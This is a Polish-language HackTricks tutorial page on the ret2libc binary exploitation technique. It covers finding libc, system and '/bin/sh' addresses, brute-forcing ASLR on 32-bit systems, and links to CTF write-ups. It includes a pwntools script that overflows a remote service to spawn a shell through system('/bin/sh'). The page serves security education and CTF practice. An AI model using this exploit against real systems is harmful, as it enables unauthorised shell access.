# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

Istotą **Ret2Libc** jest przekierowanie przepływu wykonania podatnego programu do funkcji w bibliotece współdzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania dostarczonego przez atakującego shellcode na stosie. Atakujący tworzy ładunek, który modyfikuje adres powrotu na stosie, aby wskazywał na pożądaną funkcję biblioteki, jednocześnie zapewniając, że wszelkie niezbędne argumenty są poprawnie ustawione zgodnie z konwencją wywołania.

### **Przykładowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywołania (np. system) i polecenie do wywołania (np. /bin/sh)
* Wygeneruj łańcuch ROP, aby przekazać pierwszy argument wskazujący na ciąg polecenia i przepływ wykonania do funkcji

## Znajdowanie adresów

* Zakładając, że używana `libc` to ta z bieżącej maszyny, możesz znaleźć, gdzie zostanie załadowana w pamięci za pomocą:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Jeśli chcesz sprawdzić, czy ASLR zmienia adres libc, możesz to zrobić:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znając używaną libc, możliwe jest również znalezienie offsetu do funkcji `system` za pomocą:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znając używaną libc, możliwe jest również znalezienie offsetu do funkcji łańcucha `/bin/sh` za pomocą:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Używanie gdb-peda / GEF

Znając używaną libc, możliwe jest również użycie Peda lub GEF, aby uzyskać adres funkcji **system**, funkcji **exit** oraz ciągu **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Używanie /proc/\<PID>/maps

Jeśli proces tworzy **dzieci** za każdym razem, gdy z nim rozmawiasz (serwer sieciowy), spróbuj **przeczytać** ten plik (prawdopodobnie będziesz musiał być rootem).

Tutaj możesz znaleźć **dokładnie, gdzie załadowana jest libc** wewnątrz procesu i **gdzie będzie załadowana** dla każdego dziecka procesu.

![](<../../../../.gitbook/assets/image (95).png>)

W tym przypadku jest załadowana w **0xb75dc000** (To będzie adres bazowy libc)

## Nieznana libc

Może się zdarzyć, że **nie znasz libc, którą ładuje binarka** (ponieważ może znajdować się na serwerze, do którego nie masz dostępu). W takim przypadku możesz wykorzystać lukę, aby **ujawnić kilka adresów i znaleźć, która biblioteka libc** jest używana:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz w:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Obejście ASLR w 32 bitach

Te ataki brute-forcing są **przydatne tylko dla systemów 32-bitowych**.

* Jeśli exploit jest lokalny, możesz spróbować brute-force'ować adres bazowy libc (przydatne dla systemów 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Jeśli atakujesz zdalny serwer, możesz spróbować **brute-force'ować adres funkcji `usleep` z `libc`**, przekazując jako argument 10 (na przykład). Jeśli w pewnym momencie **serwer zajmuje dodatkowe 10s na odpowiedź**, znalazłeś adres tej funkcji.

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

W tym przykładzie brute-force ASLR jest zintegrowany w kodzie, a podatny binarny plik znajduje się na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Sprawdź przykład z:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywołanie `printf`/`puts` z określonymi danymi jako argumentem.

## Ret2printf

To zasadniczo oznacza nadużywanie **Ret2lib, aby przekształcić to w podatność na formatowanie ciągów `printf`** poprzez użycie `ret2lib` do wywołania printf z wartościami do wykorzystania (brzmi bezużytecznie, ale możliwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne przykłady i odniesienia

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, pod warunkiem wycieku adresu funkcji w libc, używając jednego gadżetu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, ASLR włączone, ale bez PIE, pierwszym krokiem jest wypełnienie przepełnienia do bajtu 0x00 kanarka, aby następnie wywołać puts i wyciek. Z kanarkiem tworzony jest gadżet ROP do wywołania puts, aby wyciekł adres puts z GOT, a następnie gadżet ROP do wywołania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, ASLR włączone, brak kanarka, przepełnienie stosu w main z funkcji podrzędnej. Gadżet ROP do wywołania puts, aby wyciekł adres puts z GOT, a następnie wywołanie jednego gadżetu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak pie, brak kanarka, brak relro, nx. Używa funkcji write do wycieku adresu write (libc) i wywołuje jeden gadżet.

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
